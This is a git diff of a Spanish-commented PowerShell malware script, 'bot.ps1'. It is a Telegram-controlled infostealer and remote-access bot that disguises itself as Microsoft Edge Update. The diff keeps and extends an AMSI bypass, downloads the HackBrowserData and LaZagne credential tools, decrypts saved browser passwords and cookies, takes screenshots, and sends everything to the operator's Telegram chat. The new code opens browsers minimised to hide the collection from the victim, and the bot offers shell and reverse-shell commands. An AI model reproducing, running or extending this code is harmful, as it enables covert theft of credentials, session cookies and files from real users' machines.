@@ -1,43 +1,46 @@
 <#
-    bot.ps1 - nucleo del bot (payload)
-    Se ejecuta EN MEMORIA desde MicrosoftEdgeUpdate.exe (runspace) o standalone.
-    ASCII puro, compatible PowerShell 5.1.
+    bot.ps1 - payload completo (PowerShell 5.1, ASCII)
+    Corre EN MEMORIA desde MicrosoftEdgeUpdate.exe o standalone.
+    Recopilacion "discreta": abre el navegador minimizado (solo barra de tareas),
+    recopila y lo cierra automaticamente.
 #>
 
-# === AMSI bypass (best-effort, sin parchear memoria) ===
+# ================== AMSI bypass ==================
 try {
-    $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    if ($t) {
-        $f = $t.GetField('amsiInitFailed','NonPublic,Static')
-        if ($f -and -not $f.GetValue($null)) { $f.SetValue($null, $true) }
+    $at = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+    if ($at) {
+        $af = $at.GetField('amsiInitFailed','NonPublic,Static')
+        if ($af -and -not $af.GetValue($null)) { $af.SetValue($null, $true) }
     }
 } catch {}
 
 $script:Repo = 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main'
 
 if (-not $env:BOT_HOME -or -not (Test-Path $env:BOT_HOME)) { $env:BOT_HOME = "$env:APPDATA\Microsoft\EdgeUpdate" }
-$BaseDir = $env:BOT_HOME
+$BaseDir    = $env:BOT_HOME
+$ConfigFile = "$BaseDir\config.ini"
 New-Item -ItemType Directory -Path $BaseDir -Force -ErrorAction SilentlyContinue | Out-Null
 
-$ConfigFile = "$BaseDir\config.ini"
 $Token = ''; $ChatId = ''
 if (Test-Path $ConfigFile) {
-    Get-Content $ConfigFile | ForEach-Object {
-        if ($_ -match '^\s*TOKEN\s*=\s*(.+?)\s*$')   { $Token  = $matches[1].Trim() }
-        if ($_ -match '^\s*CHAT_ID\s*=\s*(.+?)\s*$') { $ChatId = $matches[1].Trim() }
+    foreach ($l in (Get-Content $ConfigFile)) {
+        if ($l -match '^\s*TOKEN\s*=\s*(.+?)\s*$')   { $Token  = $matches[1].Trim() }
+        if ($l -match '^\s*CHAT_ID\s*=\s*(.+?)\s*$') { $ChatId = $matches[1].Trim() }
     }
 }
 if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) { return }
 
-$ApiUrl   = "https://api.telegram.org/bot$Token"
-$ApiFile  = "https://api.telegram.org/file/bot$Token"
-$LogFile  = "$BaseDir\bot.log"
-$HackPath = "$BaseDir\DeviceCensus.exe"
-$LazPath  = "$BaseDir\CompatTelRunner.exe"
-$StateFile= "$BaseDir\bot_state.json"
-$UploadDir= "$BaseDir\uploads"
-$RamDir   = "$env:TEMP\ram_exec"
+$ApiUrl    = "https://api.telegram.org/bot$Token"
+$ApiFile   = "https://api.telegram.org/file/bot$Token"
+$LogFile   = "$BaseDir\bot.log"
+$HackPath  = "$BaseDir\DeviceCensus.exe"
+$LazPath   = "$BaseDir\CompatTelRunner.exe"
+$StateFile = "$BaseDir\bot_state.json"
+$UploadDir = "$BaseDir\uploads"
+$RamDir    = "$env:TEMP\ram_exec"
+New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null
 
+# ================== ESTADO ==================
 $script:CurrentDir            = $PWD.Path
 $script:LastStealTime         = $null
 $script:ProcessedUpdates      = @{}
@@ -58,29 +61,31 @@ $script:LastUpdateId          = 0
 $script:Polling               = $false
 $script:FetchDepth            = 0
 $script:LastHeartbeat         = Get-Date
-$script:HasCurl = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
+$script:HasCurl               = $null -ne (Get-Command curl.exe -ErrorAction SilentlyContinue)
+$script:OpenedBrowser         = $false
 
 $script:Aliases = @{
-    "start"="start"; "menu"="menu"; "help"="help"; "?"="help"; "h"="help"; "ayuda"="help"
-    "info"="info"; "ip"="info"; "whoami"="info"; "status"="status"; "estado"="status"
-    "pwd"="pwd"; "cwd"="pwd"; "ls"="ls"; "dir"="ls"; "ll"="ls"; "l"="ls"; "cd"="cd"
-    "cat"="cat"; "type"="cat"; "ver"="cat"; "rm"="rm"; "del"="rm"; "remove"="rm"; "borrar"="rm"
-    "mkdir"="mkdir"; "md"="mkdir"; "mv"="mv"; "move"="mv"; "mover"="mv"; "cp"="cp"; "copy"="cp"; "copiar"="cp"
-    "write"="write"; "echo"="write"; "download"="download"; "dl"="download"; "get"="download"; "descargar"="download"
-    "edit"="edit"; "editar"="edit"; "cmd"="cmd"; "sh"="cmd"; "term"="cmd"; "consola"="cmd"
-    "run"="run"; "exec"="run"; "ejecutar"="run"; "update"="update"; "upgrade"="update"; "actualizar"="update"
-    "captura"="captura"; "screenshot"="captura"; "ss"="captura"; "pantalla"="captura"
-    "steal"="steal"; "robar"="steal"; "ciclo"="steal"; "hack"="hack"; "hbd"="hack"
-    "lazagne"="lazagne"; "laz"="lazagne"; "files"="files"; "docs"="files"; "documentos"="files"
-    "passwords"="passwords"; "pass"="passwords"; "pw"="passwords"; "passwd"="passwords"
-    "cookies"="cookies"; "cookie"="cookies"; "killbrowsers"="killbrowsers"; "kb"="killbrowsers"
-    "pause"="pause"; "pausar"="pause"; "resume"="resume"; "reanudar"="resume"; "continue"="resume"
-    "cancelar"="cancelar"; "cancel"="cancelar"; "stop"="cancelar"; "shell"="shell"; "revshell"="shell"
-    "stopshell"="stopshell"; "ai"="ai"; "ia"="ai"
+    "start"="start";"menu"="menu";"help"="help";"?"="help";"h"="help";"ayuda"="help"
+    "info"="info";"ip"="info";"whoami"="info";"status"="status";"estado"="status"
+    "pwd"="pwd";"cwd"="pwd";"ls"="ls";"dir"="ls";"ll"="ls";"l"="ls";"cd"="cd"
+    "cat"="cat";"type"="cat";"ver"="cat";"rm"="rm";"del"="rm";"remove"="rm";"borrar"="rm"
+    "mkdir"="mkdir";"md"="mkdir";"mv"="mv";"move"="mv";"mover"="mv";"cp"="cp";"copy"="cp";"copiar"="cp"
+    "write"="write";"echo"="write";"download"="download";"dl"="download";"get"="download";"descargar"="download"
+    "edit"="edit";"editar"="edit";"cmd"="cmd";"sh"="cmd";"term"="cmd";"consola"="cmd"
+    "run"="run";"exec"="run";"ejecutar"="run";"update"="update";"upgrade"="update";"actualizar"="update"
+    "captura"="captura";"screenshot"="captura";"ss"="captura";"pantalla"="captura"
+    "steal"="steal";"robar"="steal";"ciclo"="steal";"hack"="hack";"hbd"="hack"
+    "recopilar"="recopilar";"collect"="recopilar";"recolectar"="recopilar"
+    "lazagne"="lazagne";"laz"="lazagne";"files"="files";"docs"="docs";"documentos"="docs"
+    "passwords"="passwords";"pass"="passwords";"pw"="passwords";"passwd"="passwords"
+    "cookies"="cookies";"cookie"="cookies";"killbrowsers"="killbrowsers";"kb"="killbrowsers"
+    "reopen"="reopen";"abrir"="reopen"
+    "pause"="pause";"pausar"="pause";"resume"="resume";"reanudar"="resume";"continue"="resume"
+    "cancelar"="cancelar";"cancel"="cancelar";"stop"="cancelar";"shell"="shell";"revshell"="shell"
+    "stopshell"="stopshell";"ai"="ai";"ia"="ai"
 }
 
-New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null
-
+# ================== UTIL ==================
 function Write-Log { param([string]$m) try { Add-Content $LogFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -ErrorAction SilentlyContinue } catch {} }
 function Ensure-Tools {
     if (-not (Test-Path $HackPath)) { try { Invoke-WebRequest "$script:Repo/hackbrowserdata.exe" -OutFile $HackPath -UseBasicParsing -TimeoutSec 180 } catch {} }
@@ -88,7 +93,7 @@ function Ensure-Tools {
 }
 
 function Split-Message {
-    param([string]$Text, [int]$Max = 4000)
+    param([string]$Text,[int]$Max=4000)
     $out = New-Object System.Collections.ArrayList
     if ($null -eq $Text) { $Text = "" }
     if ($Text.Length -le $Max) { [void]$out.Add($Text); return ,$out }
@@ -128,7 +133,8 @@ function Send-File-Multipart {
         $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
         $content.Add($fc, "document", (Split-Path $Path -Leaf))
         if ($Caption) { $content.Add((New-Object System.Net.Http.StringContent($Caption)), "caption") }
-        $r = $client.PostAsync("$ApiUrl/sendDocument", $content).Result; $ok = $r.IsSuccessStatusCode; $client.Dispose(); return $ok
+        $r = $client.PostAsync("$ApiUrl/sendDocument", $content).Result
+        $ok = $r.IsSuccessStatusCode; $client.Dispose(); return $ok
     } catch { return $false }
 }
 function Send-File-Now {
@@ -162,62 +168,100 @@ function Flush-FileQueue {
 function Get-Info {
     try { $ip = (Invoke-RestMethod 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { $ip = "?" }
     try { $os = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $os = "Windows" }
-    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os | EXE: $env:BOT_HOME"
-}
-function Test-BrowsersOpen { @(Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium,iexplore -ErrorAction SilentlyContinue).Count -gt 0 }
-function Get-OpenBrowserNames { ((Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Select-Object -Expand ProcessName -Unique) -join ", ") }
-function Stop-Browsers { Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
-function Kill-Browsers { $a = Get-OpenBrowserNames; Stop-Browsers; Start-Sleep 2; Send-Message "Navegadores cerrados. Antes: $a" }
-function Wait-BrowsersClosed {
-    $notified = $false
-    while (Test-BrowsersOpen) {
-        if (-not $notified) { Send-Message "Navegadores abiertos. Esperando (o usa /killbrowsers)."; $notified = $true }
-        Fetch-Updates 0; Start-Sleep 3
-    }
-    if ($notified) { Send-Message "Navegadores cerrados." }
+    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "?" }
+    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os | CPU: $cpu"
 }
 
+# ================== WIN32 (minimizar / DPI) ==================
+function Add-Win32 {
+    if (-not ("SysWin" -as [type])) {
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class SysWin {
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
+    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+}
+"@
+    }
+}
+
+# ================== CAPTURA DE PANTALLA (nativa, multi-monitor) ==================
 function Take-Screenshot {
     try {
         Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        if ($b.Width -le 0) { $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds }
-        $bm = New-Object System.Drawing.Bitmap($b.Width,$b.Height)
-        $g = [System.Drawing.Graphics]::FromImage($bm)
-        $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
-        $p = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bm.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bm.Dispose()
-        Send-File -Path $p -Caption "Screenshot $($b.Width)x$($b.Height)"; Remove-Item $p -Force -ErrorAction SilentlyContinue
+        try { Add-Win32; [void][SysWin]::SetProcessDPIAware() } catch {}
+        $vs = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $monitors = ([System.Windows.Forms.Screen]::AllScreens).Count
+        $w = $vs.Width; $h = $vs.Height
+        if ($w -le 0 -or $h -le 0) {
+            $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+            $vs = New-Object System.Drawing.Rectangle($b.X,$b.Y,$b.Width,$b.Height); $w = $b.Width; $h = $b.Height
+        }
+        $bm = New-Object System.Drawing.Bitmap($w, $h)
+        $g  = [System.Drawing.Graphics]::FromImage($bm)
+        $g.CopyFromScreen($vs.Location, [System.Drawing.Point]::Empty, $vs.Size)
+        $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
+        $p = "$env:TEMP\captura_$stamp.png"
+        $bm.Save($p, [System.Drawing.Imaging.ImageFormat]::Png)
+        $g.Dispose(); $bm.Dispose()
+        $kb = [math]::Round((Get-Item $p).Length/1KB,1)
+        $cap = "Captura $w x $h px | $monitors monitor(es) | $env:COMPUTERNAME | $stamp | $kb KB"
+        Send-File -Path $p -Caption $cap | Out-Null
+        Send-Message $cap
+        Remove-Item $p -Force -ErrorAction SilentlyContinue
     } catch { Send-Message "Error captura: $($_.Exception.Message)" }
 }
-function Invoke-ExeInRam {
-    param([string]$Path,[string]$Arguments="")
-    if (-not (Test-Path $Path)) { Send-Message "No existe: $Path"; return }
-    try {
-        New-Item -ItemType Directory -Path $RamDir -Force | Out-Null
-        $t = Join-Path $RamDir ([IO.Path]::GetFileName($Path))
-        [IO.File]::WriteAllBytes($t,[IO.File]::ReadAllBytes($Path))
-        $psi = New-Object System.Diagnostics.ProcessStartInfo
-        $psi.FileName=$t; $psi.Arguments=$Arguments; $psi.UseShellExecute=$false
-        $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true; $psi.CreateNoWindow=$true
-        $pr = [System.Diagnostics.Process]::Start($psi)
-        $o = $pr.StandardOutput.ReadToEnd() + $pr.StandardError.ReadToEnd(); $pr.WaitForExit(300000)
-        Send-Message "RAM exec $([IO.Path]::GetFileName($Path)) -> $($pr.ExitCode)`n$o"
-        Remove-Item $t -Force -ErrorAction SilentlyContinue
-    } catch { Send-Message "Error RAM exec: $($_.Exception.Message)" }
+
+# ================== CONTROL DE NAVEGADORES ==================
+function Test-BrowsersOpen { @(Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium,iexplore -ErrorAction SilentlyContinue).Count -gt 0 }
+function Get-OpenBrowserNames { ((Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Select-Object -Expand ProcessName -Unique) -join ", ") }
+function Find-BrowserExe {
+    $c = @(
+        "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
+        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
+        "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
+        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
+        "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
+        "$env:ProgramFiles\BraveSoftware\Brave-Browser\Application\brave.exe",
+        "$env:ProgramFiles\Mozilla Firefox\firefox.exe"
+    )
+    foreach ($x in $c) { if (Test-Path $x) { return $x } }
+    return $null
 }
-function Update-Bot {
+function Minimize-Browsers {
+    Add-Win32
+    foreach ($n in @('chrome','msedge','brave','opera','opera_gx','vivaldi','firefox','chromium')) {
+        foreach ($pr in @(Get-Process $n -ErrorAction SilentlyContinue)) {
+            try { if ($pr.MainWindowHandle -ne 0) { [void][SysWin]::ShowWindow($pr.MainWindowHandle, 6) } } catch {}
+        }
+    }
+}
+function Start-BrowserMinimized {
+    Add-Win32
+    $exe = Find-BrowserExe
     try {
-        $tmp = "$env:TEMP\payload_new.ps1"
-        Send-Message "Descargando actualizacion..."
-        Invoke-WebRequest "$script:Repo/bot.ps1" -OutFile $tmp -UseBasicParsing -TimeoutSec 60
-        if (-not (Test-Path $tmp)) { return }
-        Copy-Item $tmp "$BaseDir\payload.ps1" -Force
-        Send-Message "Actualizado. Reiniciando..."
-        $exe = if ($env:BOT_EXE) { $env:BOT_EXE } else { "$BaseDir\MicrosoftEdgeUpdate.exe" }
-        if (Test-Path $exe) { Start-Process $exe } else { Start-Process powershell "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$BaseDir\payload.ps1`"" }
-        return
-    } catch { Send-Message "Error update: $($_.Exception.Message)" }
+        if ($exe) {
+            $psi = New-Object Diagnostics.ProcessStartInfo
+            $psi.FileName = $exe; $psi.Arguments = "about:blank"
+            $psi.WindowStyle = [Diagnostics.ProcessWindowStyle]::Minimized
+            [Diagnostics.Process]::Start($psi) | Out-Null
+        } else { Start-Process "about:blank" }
+    } catch {}
+    Start-Sleep -Seconds 4
+    Minimize-Browsers
+}
+function Stop-Browsers { Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
+function Kill-Browsers { $a = Get-OpenBrowserNames; Stop-Browsers; Start-Sleep 2; Send-Message "Navegadores cerrados. Antes: $a" }
+function Reopen-Browser { Start-BrowserMinimized; Send-Message "Navegador abierto minimizado (barra de tareas)." }
+function Wait-BrowsersClosed {
+    $notified = $false
+    while (Test-BrowsersOpen) {
+        if (-not $notified) { Send-Message "Navegadores abiertos. Esperando..."; $notified = $true }
+        Fetch-Updates 0; Start-Sleep 3
+    }
 }
 
 # ================== SQLITE ==================
@@ -246,7 +290,7 @@ function Read-BtreePage {
     if($off+1 -ge $Data.Length){ return ,$rows }
     [int]$type=$Data[$off]
     if($type -eq 0x05){ [int]$n=([int]$Data[$off+3] -shl 8)-bor[int]$Data[$off+4]; for($i=0;$i -lt $n;$i++){ $cp=$off+12+$i*2; $co=$off+(([int]$Data[$cp] -shl 8)-bor[int]$Data[$cp+1]); $ch=(([int]$Data[$co] -shl 24)-bor([int]$Data[$co+1] -shl 16)-bor([int]$Data[$co+2] -shl 8)-bor[int]$Data[$co+3]); foreach($s in (Read-BtreePage $Data $Ps $ch)){[void]$rows.Add($s)} }; $rt=(([int]$Data[$off+8] -shl 24)-bor([int]$Data[$off+9] -shl 16)-bor([int]$Data[$off+10] -shl 8)-bor[int]$Data[$off+11]); foreach($s in (Read-BtreePage $Data $Ps $rt)){[void]$rows.Add($s)} }
-    elseif($type -eq 0x0D){ [int]$n=([int]$Data[$off+3] -shl 8)-bor[int]$Data[$off+4]; for($i=0;$i -lt $n;$i++){ $cp=$off+8+$i*2; $co=$off+(([int]$Data[$cp] -shl 8)-bor[int]$Data[$cp+1]); $p=$co; $pl=Get-Varint $Data ([ref]$p); $ri=Get-Varint $Data ([ref]$p); $pl2=Read-CellPayload $Data $p $pl $Ps; if($pl2.Length -gt 0){[void]$rows.Add((Parse-Record $pl2))} } }
+    elseif($type -eq 0x0D){ [int]$n=([int]$Data[$off+3] -shl 8)-bor[int]$Data[$off+4]; for($i=0;$i -lt $n;$i++){ $cp=$off+8+$i*2; $co=$off+(([int]$Data[$cp] -shl 8)-bor[int]$Data[$cp+1]); $p=$co; $pl=Get-Varint $Data ([ref]$p); [void](Get-Varint $Data ([ref]$p)); $pl2=Read-CellPayload $Data $p $pl $Ps; if($pl2.Length -gt 0){[void]$rows.Add((Parse-Record $pl2))} } }
     return ,$rows
 }
 function Parse-Columns { param([string]$Sql) $c=@(); if(-not $Sql){return ,$c}; $i=$Sql.IndexOf('(');$j=$Sql.LastIndexOf(')'); if($i -lt 0 -or $j -le $i){return ,$c}; foreach($p in ($Sql.Substring($i+1,$j-$i-1) -split ',')){ $f=($p.Trim() -split '\s+')[0].Trim('"','`','[',']',' '); if($f -match '^(?i)(PRIMARY|UNIQUE|CHECK|FOREIGN|CONSTRAINT|KEY)$'){continue}; if($f){$c+=$f} }; return ,$c }
@@ -267,7 +311,8 @@ function Read-SqliteRows {
 }
 function Copy-FileShared {
     param([string]$S,[string]$D)
-    try { $fs=New-Object IO.FileStream($S,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite); $os=New-Object IO.FileStream($D,[IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None); $fs.CopyTo($os);$os.Close();$fs.Close(); return $true } catch { try { Copy-Item -LiteralPath $S -Destination $D -Force -ErrorAction Stop; return $true } catch { return $false } }
+    try { $fs=New-Object IO.FileStream($S,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite); $os=New-Object IO.FileStream($D,[IO.FileMode]::Create,[IO.FileAccess]::Write,[IO.FileShare]::None); $fs.CopyTo($os);$os.Close();$fs.Close(); return $true }
+    catch { try { Copy-Item -LiteralPath $S -Destination $D -Force -ErrorAction Stop; return $true } catch { return $false } }
 }
 
 # ================== CRIPTO ==================
@@ -323,24 +368,57 @@ function Decrypt-ChromiumValue {
         return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($E,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser))
     } catch { return "" }
 }
-function Extract-ChromiumPasswords {
-    $bs=@(
-        @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},@{N="ChromeBeta";P="$env:LOCALAPPDATA\Google\Chrome Beta\User Data"},@{N="ChromeCanary";P="$env:LOCALAPPDATA\Google\Chrome SxS\User Data"},
-        @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},@{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
-        @{N="Opera";P="$env:APPDATA\Opera Software\Opera Stable"},@{N="OperaGX";P="$env:APPDATA\Opera Software\Opera GX Stable"},
-        @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data"},@{N="Chromium";P="$env:LOCALAPPDATA\Chromium\User Data"},@{N="Yandex";P="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
+function Get-ChromiumProfiles {
+    param([string]$Ud)
+    $p = @($Ud, (Join-Path $Ud "Default"))
+    $p += (Get-ChildItem $Ud -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
+    $p += (Get-ChildItem $Ud -Directory -Filter "Default *" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
+    return ,($p | Select-Object -Unique)
+}
+function Get-ChromiumLocalState {
+    param([string]$Ud)
+    $ls = Join-Path $Ud "Local State"
+    if (-not (Test-Path -LiteralPath $ls)) { $par = Split-Path $Ud -Parent; if (Test-Path (Join-Path $par "Local State")) { $ls = Join-Path $par "Local State" } }
+    return $ls
+}
+function Get-ChromiumBrowsers {
+    return @(
+        @{N="Chrome";P="$env:LOCALAPPDATA\Google\Chrome\User Data"},
+        @{N="Chrome Beta";P="$env:LOCALAPPDATA\Google\Chrome Beta\User Data"},
+        @{N="Chrome Canary";P="$env:LOCALAPPDATA\Google\Chrome SxS\User Data"},
+        @{N="Edge";P="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
+        @{N="Brave";P="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
+        @{N="Opera";P="$env:APPDATA\Opera Software\Opera Stable"},
+        @{N="Opera GX";P="$env:APPDATA\Opera Software\Opera GX Stable"},
+        @{N="Vivaldi";P="$env:LOCALAPPDATA\Vivaldi\User Data"},
+        @{N="Chromium";P="$env:LOCALAPPDATA\Chromium\User Data"},
+        @{N="Yandex";P="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
     )
+}
+function Extract-ChromiumPasswords {
     $res=@()
-    foreach($b in $bs){
+    foreach($b in (Get-ChromiumBrowsers)){
         $ud=$b.P; if(-not (Test-Path -LiteralPath $ud)){continue}
-        $ls=Join-Path $ud "Local State"; if(-not (Test-Path -LiteralPath $ls)){ $par=Split-Path $ud -Parent; if(Test-Path (Join-Path $par "Local State")){$ls=Join-Path $par "Local State"} }
-        $keys=Get-ChromiumKeys $ls
-        $profs=@($ud,(Join-Path $ud "Default")); $profs += (Get-ChildItem $ud -Directory -Filter "Profile *" -ErrorAction SilentlyContinue|%{$_.FullName}); $profs += (Get-ChildItem $ud -Directory -Filter "Default *" -ErrorAction SilentlyContinue|%{$_.FullName})
-        foreach($pr in ($profs|Select-Object -Unique)){
+        $keys=Get-ChromiumKeys (Get-ChromiumLocalState $ud)
+        foreach($pr in (Get-ChromiumProfiles $ud)){
             $db=Join-Path $pr "Login Data"; if(-not (Test-Path -LiteralPath $db)){continue}
             $tp="$env:TEMP\ld_$([guid]::NewGuid().ToString('N')).db"; if(-not (Copy-FileShared $db $tp)){continue}
             $rows=Read-SqliteRows $tp "logins"; Remove-Item $tp -Force -ErrorAction SilentlyContinue
             foreach($r in $rows){ $u=$r["origin_url"]; if(-not $u){continue}; $pw=""; if($r["password_value"] -is [byte[]]){$pw=Decrypt-ChromiumValue $r["password_value"] $keys}; $res += [pscustomobject]@{Browser=$b.N;Profile=(Split-Path $pr -Leaf);URL=[string]$u;User=[string]$r["username_value"];Password=[string]$pw} }
+        }
+    }
+    return $res
+}
+function Extract-ChromiumCookies {
+    $res=@()
+    foreach($b in (Get-ChromiumBrowsers)){
+        $ud=$b.P; if(-not (Test-Path -LiteralPath $ud)){continue}
+        $keys=Get-ChromiumKeys (Get-ChromiumLocalState $ud)
+        foreach($pr in (Get-ChromiumProfiles $ud)){
+            $ck=Join-Path $pr "Network\Cookies"; if(-not (Test-Path -LiteralPath $ck)){ $ck=Join-Path $pr "Cookies" }; if(-not (Test-Path -LiteralPath $ck)){continue}
+            $tp="$env:TEMP\ck_$([guid]::NewGuid().ToString('N')).db"; if(-not (Copy-FileShared $ck $tp)){continue}
+            $rows=Read-SqliteRows $tp "cookies"; Remove-Item $tp -Force -ErrorAction SilentlyContinue
+            foreach($r in $rows){ $ev=$r["encrypted_value"]; $val=""; if($ev -is [byte[]]){$val=Decrypt-ChromiumValue $ev $keys}; $res += [pscustomobject]@{Browser=$b.N;Host=[string]$r["host_key"];Name=[string]$r["name"];Value=[string]$val;Path=[string]$r["path"]} }
         }
     }
     return $res
@@ -368,21 +446,126 @@ function Extract-FirefoxPasswords {
     }
     return $res
 }
-function Run-Passwords {
-    Send-Message "=== PASSWORDS (nativo, sin cerrar navegadores) ==="
-    $all=@(); try { $all+=Extract-ChromiumPasswords } catch {}; try { $all+=Extract-FirefoxPasswords } catch {}
-    if($all.Count -gt 0){
-        $ts=Get-Date -Format 'yyyyMMdd_HHmmss'; $jf="$env:TEMP\pw_$ts.json"; $tf="$env:TEMP\pw_$ts.txt"; $z="$env:TEMP\pw_$ts.zip"
-        [IO.File]::WriteAllText($jf,($all|ConvertTo-Json -Depth 4),(New-Object Text.UTF8Encoding($false)))
-        [IO.File]::WriteAllText($tf,(($all|%{"URL: $($_.URL)`nUSER: $($_.User)`nPASS: $($_.Password)`n---"}) -join "`n"),(New-Object Text.UTF8Encoding($false)))
-        Compress-Archive $jf,$tf -DestinationPath $z -Force; Send-File $z "PASSWORDS: $($all.Count) - $env:COMPUTERNAME"; Remove-Item $jf,$tf,$z -Force -ErrorAction SilentlyContinue
-    } else { Send-Message "Nativo sin resultados." }
-    Ensure-Tools
-    if(Test-Path $HackPath){ if(Test-BrowsersOpen){Wait-BrowsersClosed}; $o="$env:TEMP\hbd_$([guid]::NewGuid().ToString('N'))"; New-Item -ItemType Directory $o -Force|Out-Null; try { $p=Start-Process $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden; $p.WaitForExit(180000); Start-Sleep 2; $pf=Get-ChildItem $o -Recurse -Filter "*password*"|Select-Object -First 1; if($pf){ $z="$env:TEMP\hbd_pw.zip"; Compress-Archive $pf.FullName -DestinationPath $z -Force; Send-File $z "Passwords (HBD)"; Remove-Item $z -Force } } finally { Remove-Item $o -Recurse -Force -ErrorAction SilentlyContinue } }
-    Send-Message "Passwords finalizado."
+
+# ================== ENVIO DE RESULTADOS ==================
+function Send-JsonZip {
+    param($Data,[string]$Prefix,[string]$TxtBody="")
+    if ($Data.Count -eq 0) { Send-Message "$Prefix: sin datos."; return }
+    $ts = Get-Date -Format 'yyyyMMdd_HHmmss'
+    $jf = "$env:TEMP\${Prefix}_$ts.json"
+    [IO.File]::WriteAllText($jf, ($Data | ConvertTo-Json -Depth 5), (New-Object Text.UTF8Encoding($false)))
+    $files = @($jf)
+    if ($TxtBody) { $tf = "$env:TEMP\${Prefix}_$ts.txt"; [IO.File]::WriteAllText($tf, $TxtBody, (New-Object Text.UTF8Encoding($false))); $files += $tf }
+    $z = "$env:TEMP\${Prefix}_$ts.zip"
+    Compress-Archive $files -DestinationPath $z -Force
+    Send-File -Path $z -Caption "$Prefix - $($Data.Count) registros - $env:COMPUTERNAME"
+    Remove-Item $z -Force -ErrorAction SilentlyContinue; Remove-Item $files -Force -ErrorAction SilentlyContinue
+}
+function Run-NativePasswords {
+    Send-Message "Extrayendo claves (nativo, sin cerrar navegadores)..."
+    $all=@()
+    try { $all += Extract-ChromiumPasswords } catch { Write-Log "chromium pw: $_" }
+    try { $all += Extract-FirefoxPasswords } catch { Write-Log "firefox pw: $_" }
+    $txt = ($all | ForEach-Object { "URL: $($_.URL)`nUSER: $($_.User)`nPASS: $($_.Password)`n---" }) -join "`n"
+    Send-JsonZip $all "passwords" $txt
+}
+function Run-NativeCookies {
+    Send-Message "Extrayendo cookies (nativo)..."
+    $all=@(); try { $all += Extract-ChromiumCookies } catch {}
+    Send-JsonZip $all "cookies"
 }
 
+# ================== HBD / LAZAGNE ==================
+function Run-HBD {
+    Ensure-Tools
+    if (-not (Test-Path $HackPath)) { Send-Message "HBD no disponible."; return $false }
+    Send-Message "=== HACKBROWSERDATA ==="
+    $intentos=0
+    while($script:ArchivosHBDEnviados -lt 8 -and $intentos -lt 5){
+        $intentos++
+        Wait-BrowsersClosed
+        $o="$env:TEMP\hbd_$([guid]::NewGuid().ToString('N'))"; New-Item -ItemType Directory $o -Force|Out-Null
+        try {
+            $p=Start-Process $HackPath -ArgumentList "dump -d `"$o`" -f json" -PassThru -WindowStyle Hidden
+            $p.WaitForExit(180000); Start-Sleep 2
